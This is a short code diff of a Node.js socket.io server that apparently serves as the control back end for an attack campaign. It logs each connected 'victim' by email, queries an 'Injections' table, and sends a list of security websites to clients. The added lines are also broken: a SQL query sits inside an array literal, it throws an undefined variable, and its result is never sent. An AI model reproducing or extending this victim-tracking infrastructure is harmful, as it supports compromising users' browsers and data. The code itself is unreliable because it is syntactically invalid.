@@ -202,9 +202,14 @@ io.on('connection', (socket) => {
       console.log("1 victim added: "+userInfo.email);
     });
     socket.emit('securityWebsites', [
-      // "www.google.com",
-      // "www.youtube.com"
-      "http://corndog.io/"
+      var sql = "SELECT url FROM SecurityWebsites";
+      con.query(sql, function(err, result) {
+        if(err) throw error;
+        var arr = [];
+        result.forEach((row) => {
+          if (row.url) arr.push(row.url);
+        });
+      });
     ]);
     var sql = "SELECT * FROM Injections";
     con.query(sql, function (err, result) {
